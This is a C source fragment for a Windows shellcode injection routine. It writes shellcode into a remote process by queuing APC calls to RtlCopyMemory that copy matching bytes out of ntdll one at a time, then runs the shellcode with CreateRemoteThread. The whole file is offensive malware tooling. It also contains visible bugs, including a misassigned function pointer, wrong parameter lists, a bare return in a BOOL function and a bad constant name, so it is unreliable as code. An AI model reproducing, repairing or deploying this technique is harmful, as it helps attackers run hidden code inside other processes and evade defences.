
BOOL InjectShellcode(HANDLE hProcess,HANDLE hThread,PBYTE shellcode, size_t shellcodeSize){
	//assume thread is already created suspended
	if (hProcess == NULL || hThread == NULL || shellcode == NULL)
		return;
	BOOL result;
	static NTSTATUS(WINAPI *_RtlCopyMemory)(
		IN  LPVOID Destination,
		IN  LPCVOID Source,
		SIZE_T Length
	) = NULL;
	static NTSTATUS(WINAPI *_NtQueueApcThread)(
		IN  HANDLE hThread,
		_in_opt HANDLE UserApcReserveHandle,
		__in PPS_APC_ROUTINE ApcRoutine,
		__in_opt LPVOID ApcArgument1,
		__in_opt LPVOID ApcArgument2,
		__in_opt LPVOID ApcArgument3
	) = NULL;
	
	HANDLE hNtdll = LoadLibraryA("ntdll.dll");
	if (hNtdll == NULL)
		return FALSE;
	// ntdll should be loaded at the same address for all processes
	FARPROC procPtr;
	if (_RtlCopyMemory == NULL){
		procPtr = GetProcAddress(hNtdll,"RtlCopyMemory");
		_RtlCopyMemory = (NTSTATUS(WINAPI*)(
			LPVOID,
			LPCVOID,
			SIZE_T
		)procPtr;
	}
	if (_NtQueueApcThread == NULL){
		procPtr = GetProcAddress(hNtdll,"NtQueueApcThread");
		_RtlCopyMemory = (NTSTATUS(WINAPI*)(
			HANDLE,
			PPS_APC_ROUTINE,
			LPVOID,
			LPVOID,
			LPVOID
		)procPtr;
	}
	if (_RtlCopyMemory == NULL || _NtQueueApcThread == NULL){
		return FALSE;
	}
	ScraperData data;
	result = FillScraperData(&data,"ntdll.dll");
	if (!result){
		return FALSE;
	}
	LPVOID remoteBuffer = VirtualAllocEx(
		hProcess,
		NULL,
		shellcodeSize,
		MEM_RESERVE | MEM_COMMIT,
		EXECUTE_READWRITE);
	if (remoteBuffer == NULL){
		return FALSE;
	}
		
	static LPVOID found[256] = { 0 };
	for (int i = 0; i < shellcodeSize; i++){
		if (found[shellcode[i]]){
			goto Inject;
		}
		else if (FindBytes(&data, &shellcode[i], 1,
			&found[shellcode[i]])){
			goto Inject;
		}
		else 
			goto FAILURE;
		Inject:
		_NtQueueApcThread(
			hThread,
			(PPS_APC_ROUTINE)_RtlCopyMemory,
			&remoteBuffer[i],
			found[shellcode[i]],
			(LPVOID)1);
	}
	HANDLE hThread2;
	hThread2 = CreateRemoteThread(
		hProcess,
		NULL,
		0,
		remoteBuffer,
		0,
		NULL);
	WaitForSingleObject(hThread2,INFINITE);
	VirtualFreeEx(
		hProcess,
		remoteBuffer,
		0,
		MEM_RELEASE);
	return TRUE;
	
	FAILURE:
	VirtualFreeEx(
		hProcess,
		remoteBuffer,
		0,
		MEM_RELEASE);
	return FALSE;
}